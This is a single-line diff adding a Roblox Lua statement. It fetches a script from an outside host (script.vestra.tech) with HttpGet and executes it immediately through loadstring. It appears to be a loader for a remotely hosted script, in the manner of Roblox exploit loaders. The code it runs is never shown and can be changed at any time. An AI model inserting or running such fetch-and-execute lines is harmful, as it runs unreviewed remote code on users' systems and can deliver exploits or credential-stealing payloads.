@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://script.vestra.tech"))()
